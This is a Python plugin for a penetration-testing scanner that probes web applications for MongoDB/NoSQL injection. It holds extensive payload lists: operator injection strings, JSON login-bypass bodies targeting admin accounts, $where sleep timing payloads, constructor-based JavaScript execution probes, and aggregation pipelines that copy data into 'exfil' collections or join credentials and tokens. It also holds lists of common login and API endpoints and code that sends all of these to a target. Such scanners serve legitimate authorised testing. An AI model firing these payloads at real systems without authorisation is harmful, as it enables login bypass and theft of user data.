"""NoSQL injection detection — MongoDB/CouchDB operators, auth bypass, blind timing.

Uses PayloadEngine for NoSQLi payloads, WafBypassEngine for WAF evasion.
Detects: operator injection ($ne/$gt/$regex/$where), auth bypass,
time-based blind ($where sleep), aggregation injection, JS injection.
Level: nosqlmap-lite (detection).
"""

from __future__ import annotations

import json
import logging
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import PayloadCategory

logger = logging.getLogger(__name__)

# ── Query string operator injection ────────────────────────────────────
QS_PAYLOADS = [
    # Comparison operators
    ("[$ne]=", "operator_ne"),
    ("[$gt]=", "operator_gt"),
    ("[$gte]=", "operator_gte"),
    ("[$lt]=", "operator_lt"),
    ("[$lte]=", "operator_lte"),
    # Pattern / regex
    ("[$regex]=.*", "operator_regex"),
    ("[$regex]=^admin", "operator_regex_prefix"),
    ("[$options]=i", "operator_options"),
    # Existence / type
    ("[$exists]=true", "operator_exists"),
    ("[$exists]=false", "operator_exists_false"),
    ("[$type]=2", "operator_type"),
    ("[$type]=string", "operator_type_string"),
    # Array operators
    ("[$in][]=admin", "operator_in"),
    ("[$in][]=root&q[$in][]=administrator", "operator_in_multi"),
    ("[$nin][]=guest", "operator_nin"),
    ("[$all][]=admin", "operator_all"),
    ("[$elemMatch][$gt]=", "operator_elemmatch"),
    ("[$size]=1", "operator_size"),
    # Logical operators
    ("[$or][0][username]=admin", "operator_or"),
    ("[$or][0][$gt]=", "operator_or_gt"),
    ("[$and][0][$ne]=", "operator_and_ne"),
    ("[$not][$eq]=nonexistent", "operator_not"),
    ("[$nor][0][username]=admin", "operator_nor"),
    # Evaluation operators
    ("[$where]=1", "operator_where"),
    ("[$mod][0]=2&q[$mod][1]=0", "operator_mod"),
    ("[$text][$search]=admin", "operator_text"),
    # Query modifiers
    ("[$comment]=basilisk_test", "operator_comment"),
    ("[$maxTimeMS]=1", "operator_maxtimems"),
    ("[$natural]=1", "operator_natural"),
    # Nested deep operators
    ("[$or][0][$gt]=&q[$or][1][$ne]=", "operator_or_deep"),
    ("[$and][0][$regex]=.*", "operator_and_regex"),
]

# ── JSON body payloads (auth bypass) ───────────────────────────────────
JSON_AUTH_PAYLOADS = [
    # Basic comparison bypass
    ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "auth_bypass_gt"),
    ({"username": {"$ne": ""}, "password": {"$ne": ""}}, "auth_bypass_ne"),
    ({"username": {"$ne": "nonexistent"}, "password": {"$ne": "x"}}, "auth_bypass_ne2"),
    ({"username": {"$gte": ""}, "password": {"$gte": ""}}, "auth_bypass_gte"),
    ({"username": {"$lt": "z"}, "password": {"$lt": "z"}}, "auth_bypass_lt"),
    # Regex bypass
    ({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}, "auth_bypass_regex"),
    ({"username": {"$regex": "^admin"}, "password": {"$gt": ""}}, "auth_bypass_admin_regex"),
    ({"username": {"$regex": "^a", "$options": "i"}, "password": {"$ne": ""}},
     "auth_bypass_regex_options"),
    ({"username": {"$regex": ".*", "$options": "si"}, "password": {"$regex": ".*"}},
     "auth_bypass_regex_dotall"),
    # Enum/array bypass
    ({"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}},
     "auth_bypass_in"),
    ({"username": {"$nin": ["nonexistent"]}, "password": {"$nin": [""]}},
     "auth_bypass_nin"),
    # Direct admin bypass
    ({"username": "admin", "password": {"$regex": ".*"}}, "auth_bypass_admin_pass"),
    ({"username": "admin", "password": {"$gt": ""}}, "auth_bypass_admin_gt"),
    ({"username": "admin", "password": {"$ne": "wrongpassword"}}, "auth_bypass_admin_ne"),
    ({"username": "admin", "password": {"$exists": True}}, "auth_bypass_admin_exists"),
    ({"username": "root", "password": {"$gt": ""}}, "auth_bypass_root"),
    ({"username": "administrator", "password": {"$ne": ""}}, "auth_bypass_administrator"),
    # $or bypass
    ({"$or": [{"username": "admin"}, {"username": "root"}],
      "password": {"$ne": ""}}, "auth_bypass_or"),
    ({"$or": [{"username": {"$gt": ""}}, {"email": {"$gt": ""}}],
      "password": {"$ne": ""}}, "auth_bypass_or_multi"),
    # $and bypass
    ({"$and": [{"username": {"$ne": ""}}, {"password": {"$ne": ""}}]},
     "auth_bypass_and"),
    # exists bypass
    ({"username": {"$exists": True}, "password": {"$exists": True}},
     "auth_bypass_exists"),
    # type check bypass (type 2 = string)
    ({"username": {"$type": 2}, "password": {"$type": 2}}, "auth_bypass_type"),
    # $not bypass
    ({"username": {"$not": {"$eq": "nonexistent"}},
      "password": {"$not": {"$eq": ""}}}, "auth_bypass_not"),
    # email field bypass
    ({"email": {"$gt": ""}, "password": {"$gt": ""}}, "auth_bypass_email_gt"),
    ({"email": {"$regex": ".*"}, "password": {"$ne": ""}}, "auth_bypass_email_regex"),
    ({"email": {"$ne": ""}, "password": {"$regex": ".*"}}, "auth_bypass_email_ne"),
    # Blind regex for data extraction (prefix matching)
    ({"username": "admin", "password": {"$regex": "^a"}}, "blind_regex_a"),
    ({"username": "admin", "password": {"$regex": "^p"}}, "blind_regex_p"),
    # Token / session bypass
    ({"username": {"$gt": ""}, "token": {"$gt": ""}}, "auth_bypass_token"),
    ({"user": {"$ne": ""}, "pass": {"$ne": ""}}, "auth_bypass_user_pass"),
    ({"login": {"$gt": ""}, "password": {"$gt": ""}}, "auth_bypass_login"),
]

# ── Time-based blind payloads ──────────────────────────────────────────
JSON_TIME_PAYLOADS = [
    ({"$where": "sleep(3000)"}, "time_where_sleep", 2.5),
    ({"$where": "function(){sleep(3000);return true;}"}, "time_where_func", 2.5),
    ({"$where": "this.a==1||sleep(3000)"}, "time_where_or", 2.5),
    ({"username": {"$where": "sleep(3000)"}}, "time_field_where", 2.5),
    ({"$where": "function(){var d=new Date();while(new Date()-d<3000);return true;}"},
     "time_where_busywait", 2.5),
    ({"$where": "this.constructor.constructor('return sleep(3000)')()"}, "time_rce_sleep", 2.5),
    ({"$where": "1;sleep(3000)"}, "time_where_semicolon", 2.5),
    ({"$where": "true||sleep(3000)"}, "time_where_true_or", 2.5),
]

# ── JS injection in $where ─────────────────────────────────────────────
JSON_JS_PAYLOADS = [
    ({"$where": "return true"}, "js_true", "always_true"),
    ({"$where": "return false"}, "js_false", "always_false"),
    ({"$where": "this.username=='admin'"}, "js_field_access", "field_access"),
    ({"$where": "this.password.length>0"}, "js_pass_length", "field_access"),
    ({"$where": "this.role=='admin'"}, "js_role_check", "field_access"),
    ({"$where": "Object.keys(this).length>0"}, "js_enum_keys", "key_enumeration"),
    ({"$where": "tojson(this).length>100"}, "js_tojson", "data_extraction"),
    ({"$where": "this.constructor.constructor('return 1')()"}, "js_constructor", "rce_attempt"),
]

# ── Aggregation pipeline injection ─────────────────────────────────────
JSON_AGGREGATION = [
    ([{"$match": {"username": {"$ne": ""}}}], "agg_match"),
    ([{"$group": {"_id": "$username"}}], "agg_group"),
    ([{"$lookup": {
        "from": "users", "localField": "id",
        "foreignField": "id", "as": "data",
    }}], "agg_lookup"),
    ([{"$lookup": {
        "from": "credentials", "localField": "user_id",
        "foreignField": "user_id", "as": "creds",
    }}], "agg_lookup_creds"),
    ([{"$lookup": {
        "from": "tokens", "localField": "_id",
        "foreignField": "userId", "as": "tokens",
    }}], "agg_lookup_tokens"),
    ([{"$unwind": "$password"}], "agg_unwind"),
    ([{"$project": {
        "username": 1, "password": 1, "email": 1,
    }}], "agg_project"),
    ([{"$sort": {"createdAt": -1}}, {"$limit": 100}],
     "agg_sort_limit"),
    ([{"$match": {}}, {"$out": "exfil_collection"}],
     "agg_out"),
    ([{"$match": {}}, {"$merge": {"into": "exfil"}}],
     "agg_merge"),
    ([{"$addFields": {"isAdmin": True}}], "agg_addfields"),
    ([{"$replaceRoot": {"newRoot": "$password"}}],
     "agg_replaceroot"),
    ([{"$facet": {
        "users": [{"$match": {}}],
        "count": [{"$count": "n"}],
    }}], "agg_facet"),
    ([{"$graphLookup": {
        "from": "users", "startWith": "$_id",
        "connectFromField": "_id",
        "connectToField": "managerId",
        "as": "hierarchy",
    }}], "agg_graphlookup"),
    # $function — server-side JS execution
    ([{"$addFields": {"result": {"$function": {
        "body": "return 1",
        "args": [],
        "lang": "js",
    }}}}], "agg_function"),
    # $accumulator — custom JS accumulator
    ([{"$group": {"_id": None, "total": {"$accumulator": {
        "init": "function(){return 0}",
        "accumulate": "function(s,v){return s+1}",
        "accumulateArgs": ["$username"],
        "merge": "function(a,b){return a+b}",
        "lang": "js",
    }}}}], "agg_accumulator"),
    # $convert — type coercion probe
    ([{"$addFields": {"conv": {"$convert": {
        "input": "$password",
        "to": "string",
        "onError": "err",
    }}}}], "agg_convert"),
    # $dateToString — date formatting probe
    ([{"$addFields": {"dt": {"$dateToString": {
        "format": "%Y-%m-%d",
        "date": "$createdAt",
    }}}}], "agg_datetostring"),
    # $filter — array filtering
    ([{"$project": {"filtered": {"$filter": {
        "input": "$roles",
        "as": "r",
        "cond": {"$eq": ["$$r", "admin"]},
    }}}}], "agg_filter"),
    # $map — array transformation
    ([{"$project": {"mapped": {"$map": {
        "input": "$roles",
        "as": "r",
        "in": "$$r",
    }}}}], "agg_map"),
    # $reduce — array reduction
    ([{"$project": {"reduced": {"$reduce": {
        "input": "$roles",
        "initialValue": "",
        "in": {"$concat": ["$$value", "$$this"]},
    }}}}], "agg_reduce"),
    # $switch — conditional branching
    ([{"$addFields": {"level": {"$switch": {
        "branches": [
            {"case": {"$eq": ["$role", "admin"]}, "then": 1},
        ],
        "default": 0,
    }}}}], "agg_switch"),
    # $mergeObjects — object merging
    ([{"$replaceRoot": {"newRoot": {"$mergeObjects": [
        {"leaked": True}, "$$ROOT",
    ]}}}], "agg_mergeobjects"),
    # $objectToArray — object to key-value pairs
    ([{"$project": {"fields": {
        "$objectToArray": "$$ROOT",
    }}}], "agg_objecttoarray"),
    # $arrayToObject — key-value pairs to object
    ([{"$project": {"obj": {"$arrayToObject": [
        [{"k": "test", "v": 1}],
    ]}}}], "agg_arraytoobject"),
    # $setUnion — set union
    ([{"$project": {"combined": {"$setUnion": [
        "$roles", ["admin"],
    ]}}}], "agg_setunion"),
    # $setIntersection — set intersection
    ([{"$project": {"common": {"$setIntersection": [
        "$roles", ["admin", "root"],
    ]}}}], "agg_setintersection"),
    # $literal — literal value injection
    ([{"$addFields": {
        "injected": {"$literal": {"$ne": ""}},
    }}], "agg_literal"),
]

# ── Scan targets ───────────────────────────────────────────────────────
AUTH_PAGES = [
    "/login", "/api/login", "/api/auth", "/api/v1/login",
    "/auth", "/signin", "/api/signin", "/api/v1/auth",
    "/api/authenticate", "/api/session", "/auth/login",
    "/users/login", "/users/sign_in",
    # REST / versioned auth endpoints
    "/api/v1/auth/login",
    "/api/v2/auth/login",
    "/api/auth/signin",
    "/api/v1/signin",
    "/api/login",
    "/rest/auth",
    "/rest/login",
    "/api/v1/session",
    "/api/v1/authenticate",
    "/oauth/token",
    "/api/token",
    "/auth/token",
    "/api/v1/users/login",
    "/api/v1/admin/login",
]

SEARCH_PAGES = [
    "/api/search", "/api/users", "/api/v1/users", "/search",
    "/api/products", "/api/items", "/api/v1/search", "/api/query",
    "/api/find", "/api/list", "/api/v2/users",
    # REST / versioned search endpoints
    "/api/v2/search",
    "/api/v1/products",
    "/api/v1/items",
    "/api/v1/catalog",
    "/api/v1/query",
    "/graphql",
    "/api/v1/filter",
    "/api/v1/find",
    "/api/v1/lookup",
    "/rest/search",
    "/rest/query",
    "/api/v1/autocomplete",
    "/api/v1/suggest",
    "/api/v1/typeahead",
]

API_PAGES = [
    "/api/user", "/api/v1/user", "/api/profile", "/api/account",
    "/api/data", "/api/records", "/api/v1/data",
    # REST / versioned API endpoints
    "/api/v2/data",
    "/api/v1/records",
    "/api/v1/entries",
    "/api/v1/collections",
    "/api/v1/documents",
    "/api/v1/resources",
    "/rest/api",
    "/api/v1/entities",
    "/api/v1/objects",
    "/graphql",
    "/api/v1/export",
    "/api/v1/import",
]


class NosqliCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="nosqli_check",
        display_name="NoSQL Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects NoSQL injection: MongoDB operators, auth bypass, "
            "time-based blind, JS injection, aggregation pipeline"
        ),
        produces=["nosqli_findings"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"nosqli_tests": []},
            )

        # Get PayloadEngine payloads
        engine_payloads = self._get_engine_payloads(ctx)

        # Phase 1: Query string operator injection on search/API pages
        from basilisk.utils.injection_points import collect_injection_points

        inj_points = collect_injection_points(
            target.host, ctx,
            hardcoded_paths=list(SEARCH_PAGES) + list(API_PAGES),
            hardcoded_params=["q", "search", "id", "user", "query"],
            param_filter=["q", "search", "id", "user", "query", "username", "login", "email"],
            max_points=25,
        )
        # Prioritize crawled/scan_paths pages (likely real endpoints) over
        # hardcoded fallbacks to avoid wasting timeout on non-existent paths
        crawled_paths = []
        for point in inj_points:
            if point.path not in crawled_paths:
                crawled_paths.append(point.path)
        hardcoded = list(SEARCH_PAGES) + list(API_PAGES)
        all_pages = crawled_paths + [p for p in hardcoded if p not in crawled_paths]

        for page in all_pages:
            if ctx.should_stop or len(findings) >= 3:
                break
            await self._check_qs_injection(
                ctx, base_url, page, findings, tested,
            )

        # Phase 2: JSON body auth bypass
        if not ctx.should_stop:
            for page in AUTH_PAGES:
                if ctx.should_stop or len(findings) >= 3:
                    break
                await self._check_json_auth_bypass(
                    ctx, base_url, page, findings, tested,
                )

        # Phase 3: Time-based blind via $where
        if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
            for page in AUTH_PAGES[:5] + all_pages[:5]:
                if ctx.should_stop:
                    break
                await self._check_time_based(
                    ctx, base_url, page, findings, tested,
                )

        # Phase 4: JS injection differential ($where true vs false)
        if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
            for page in all_pages[:5]:
                if ctx.should_stop:
                    break
                await self._check_js_differential(
                    ctx, base_url, page, findings, tested,
                )

        # Phase 5: PayloadEngine payloads
        if engine_payloads and not ctx.should_stop:
            for page in all_pages[:3]:
                if ctx.should_stop:
                    break
                for ep in engine_payloads[:10]:
                    if ctx.should_stop:
                        break
                    url = f"{base_url}{page}?q={quote(ep)}"
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(url, timeout=8.0)
                            body = await resp.text(encoding="utf-8", errors="replace")
                            if resp.status == 200 and len(body) > 50:
                                tested.append({
                                    "page": page, "payload": ep[:60],
                                    "method": "GET", "label": "engine_payload",
                                })
                    except Exception as e:
                        logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
                        continue

        if not findings:
            findings.append(Finding.info(
                "No NoSQL injection vulnerabilities detected",
                tags=["pentesting", "nosqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"nosqli_tests": tested},
        )

    # ── Helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _get_engine_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.NOSQLI, max_waf=1, limit=15)
            return [p.value for p in payloads]
        return []

    async def _check_qs_injection(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test query string operator injection."""
        # Baseline
        baseline_len = -1
        baseline_status = 0
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    f"{base_url}{page}?q=test", timeout=8.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                baseline_len = len(body)
                baseline_status = resp.status
        except Exception as e:
            logger.debug(
                "nosqli_check baseline %s: %s (%s)", page, e, type(e).__name__,
            )
            return

        page_anomalies: list[dict] = []
        first_error_body = ""

        for qs_payload, label in QS_PAYLOADS:
            if ctx.should_stop:
                break
            url = f"{base_url}{page}?q{quote(qs_payload, safe='')}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
            except Exception as e:
                logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
                continue

            size_diff = abs(len(body) - baseline_len)
            status_changed = resp.status != baseline_status
            size_anomaly = (
                resp.status == 200
                and size_diff > max(baseline_len * 0.3, 100)
            )

            if status_changed or size_anomaly:
                if not first_error_body:
                    first_error_body = body.lower()
                page_anomalies.append({
                    "label": label,
                    "payload_status": resp.status,
                    "size_diff": size_diff,
                    "status_changed": status_changed,
                })

        if not page_anomalies:
            return

        # Check for NoSQL error signatures in error response — if present,
        # this is a real injection, not a WAF block
        nosql_error = any(
            sig in first_error_body
            for sig in (
                "substring is not a function",
                "cast to objectid failed",
                "cast to number failed",
                "bsontype",
                "mongoerror",
                "mongo",
                "nosql",
                "$where",
                "operator",
                "criteria",
                "objectid",
                "querysyntaxerror",
                "aggregation",
                "cannot apply",
                "illegal argument",
            )
        )

        # WAF detection — skip if error response has NoSQL signatures
        all_same_status = (
            len(page_anomalies) >= 3
            and all(a["status_changed"] for a in page_anomalies)
            and len({a["payload_status"] for a in page_anomalies}) == 1
        )

        if all_same_status and not nosql_error:
            waf_status = page_anomalies[0]["payload_status"]
            tested.append({
                "page": page, "label": "waf_detected", "method": "GET",
            })
            findings.append(Finding.low(
                f"WAF blocks MongoDB operators on {page} "
                f"({baseline_status}->{waf_status})",
                description=(
                    f"All {len(page_anomalies)} operators caused identical "
                    f"status change — WAF filtering."
                ),
                evidence=f"URL: {base_url}{page}",
                remediation="WAF is blocking MongoDB operators.",
                tags=["pentesting", "nosqli", "waf-fp"],
            ))
        else:
            first = page_anomalies[0]
            tested.append({
                "page": page, "label": first["label"], "method": "GET",
                "anomaly_count": len(page_anomalies), "confirmed": True,
            })
            findings.append(Finding.high(
                f"NoSQL injection via query param on {page}",
                description=(
                    f"MongoDB operator {first['label']} caused anomalous response. "
                    f"{len(page_anomalies)}/{len(QS_PAYLOADS)} operators triggered."
                ),
                evidence=(
                    f"URL: {base_url}{page}\n"
                    f"Baseline: {baseline_status}\n"
                    f"Anomalous: {', '.join(a['label'] for a in page_anomalies)}"
                ),
                remediation=(
                    "Sanitize input before NoSQL queries. Use parameterized queries. "
                    "Reject objects/arrays in query parameters."
                ),
                tags=["pentesting", "nosqli", "injection"],
            ))

    async def _check_json_auth_bypass(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test JSON body auth bypass payloads."""
        url = f"{base_url}{page}"

        # Baseline: normal failed login
        normal_body = json.dumps({"username": "admin", "password": "wrongpass123"})
        try:
            async with ctx.rate:
                base_resp = await ctx.http.post(
                    url, data=normal_body,
                    headers={"Content-Type": "application/json"},
                    timeout=8.0,
                )
                base_text = await base_resp.text(encoding="utf-8", errors="replace")
                base_status = base_resp.status
                base_len = len(base_text)
        except Exception as e:
            logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
            return

        page_anomalies: list[dict] = []

        for payload_obj, label in JSON_AUTH_PAYLOADS:
            if ctx.should_stop:
                break
            payload_str = json.dumps(payload_obj)
            try:
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url, data=payload_str,
                        headers={"Content-Type": "application/json"},
                        timeout=8.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
            except Exception as e:
                logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
                continue

            reason = ""
            if resp.status != base_status:
                reason = f"Status {base_status}->{resp.status}"
            elif abs(len(body) - base_len) > max(base_len * 0.3, 100):
                reason = f"Size {base_len}->{len(body)}"

            # Check for auth success indicators
            body_lower = body.lower()
            auth_success = any(
                ind in body_lower
                for ind in ["token", "session", "welcome", "dashboard",
                            "success", "authenticated", "logged"]
            )
            if auth_success and resp.status in (200, 302):
                reason = f"Auth success indicators + status {resp.status}"

            if reason:
                page_anomalies.append({
                    "label": label, "reason": reason,
                    "payload_status": resp.status,
                    "status_changed": resp.status != base_status,
                })

        if not page_anomalies:
            return

        # WAF check
        all_same = (
            len(page_anomalies) >= 2
            and all(a["status_changed"] for a in page_anomalies)
            and len({a["payload_status"] for a in page_anomalies}) == 1
        )

        if all_same:
            tested.append({"page": page, "label": "waf_detected", "method": "POST"})
            findings.append(Finding.low(
                f"WAF blocks NoSQL operators on {page}",
                description="All JSON operators blocked uniformly.",
                evidence=f"URL: {url}",
                tags=["pentesting", "nosqli", "waf-fp"],
            ))
        else:
            first = page_anomalies[0]
            sev = "critical" if "auth_bypass" in first["label"] else "high"
            tested.append({
                "page": page, "label": first["label"],
                "method": "POST", "reason": first["reason"], "confirmed": True,
            })
            findings.append(getattr(Finding, sev)(
                f"NoSQL injection: auth bypass on {page}",
                description=(
                    f"NoSQL operator injection: {first['reason']}. "
                    f"{len(page_anomalies)} operators anomalous."
                ),
                evidence=(
                    f"URL: {url}\n"
                    f"Anomalous: {', '.join(a['label'] for a in page_anomalies)}"
                ),
                remediation=(
                    "Never pass raw input to NoSQL queries. "
                    "Use ODM with proper sanitization. Cast types explicitly."
                ),
                tags=["pentesting", "nosqli", "injection"],
            ))

    async def _check_time_based(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Time-based blind NoSQL injection via $where sleep."""
        url = f"{base_url}{page}"

        for payload_obj, label, threshold in JSON_TIME_PAYLOADS:
            if ctx.should_stop:
                break
            payload_str = json.dumps(payload_obj)
            try:
                async with ctx.rate:
                    t0 = time.monotonic()
                    _resp = await ctx.http.post(
                        url, data=payload_str,
                        headers={"Content-Type": "application/json"},
                        timeout=15.0,
                    )
                    elapsed = time.monotonic() - t0
                    del _resp
            except Exception as e:
                logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
                continue

            if elapsed > threshold:
                # Confirm with second attempt
                try:
                    async with ctx.rate:
                        t0 = time.monotonic()
                        await ctx.http.post(
                            url, data=payload_str,
                            headers={"Content-Type": "application/json"},
                            timeout=15.0,
                        )
                        retry = time.monotonic() - t0
                except Exception as e:
                    logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
                    continue

                if retry > threshold:
                    tested.append({
                        "page": page, "label": label, "method": "POST",
                        "elapsed": round(elapsed, 2),
                        "retry": round(retry, 2), "confirmed": True,
                    })
                    findings.append(Finding.critical(
                        f"Time-based NoSQL injection on {page}",
                        description=(
                            f"$where sleep() caused {elapsed:.1f}s delay "
                            f"(confirmed: {retry:.1f}s)"
                        ),
                        evidence=f"URL: {url}\nPayload: {label}",
                        remediation=(
                            "Disable $where operator. Never pass user input "
                            "to NoSQL JavaScript evaluation."
                        ),
                        tags=["pentesting", "nosqli", "time-based"],
                    ))
                    return

    async def _check_js_differential(
        self, ctx, base_url: str, page: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Differential detection: $where true vs $where false."""
        url = f"{base_url}{page}"

        true_payload = json.dumps({"$where": "return true"})
        false_payload = json.dumps({"$where": "return false"})

        try:
            async with ctx.rate:
                true_resp = await ctx.http.post(
                    url, data=true_payload,
                    headers={"Content-Type": "application/json"},
                    timeout=8.0,
                )
                true_body = await true_resp.text(encoding="utf-8", errors="replace")

            async with ctx.rate:
                false_resp = await ctx.http.post(
                    url, data=false_payload,
                    headers={"Content-Type": "application/json"},
                    timeout=8.0,
                )
                false_body = await false_resp.text(encoding="utf-8", errors="replace")
        except Exception as e:
            logger.debug("nosqli_check: %s (%s)", e, type(e).__name__)
            return

        # Significant difference between true and false
        size_diff = abs(len(true_body) - len(false_body))
        status_diff = true_resp.status != false_resp.status

        if (
            (size_diff > max(len(true_body) * 0.2, 100) or status_diff)
            and true_resp.status in (200, 302)
        ):
            tested.append({
                "page": page, "label": "js_differential",
                "method": "POST", "confirmed": True,
                "true_len": len(true_body), "false_len": len(false_body),
            })
            findings.append(Finding.high(
                f"NoSQL JS injection: $where differential on {page}",
                description=(
                    f"$where true ({len(true_body)} bytes, {true_resp.status}) vs "
                    f"$where false ({len(false_body)} bytes, {false_resp.status})"
                ),
                evidence=f"URL: {url}\nSize diff: {size_diff}",
                remediation=(
                    "Disable $where operator in MongoDB. "
                    "Never evaluate user input as JavaScript."
                ),
                tags=["pentesting", "nosqli", "js-injection"],
            ))
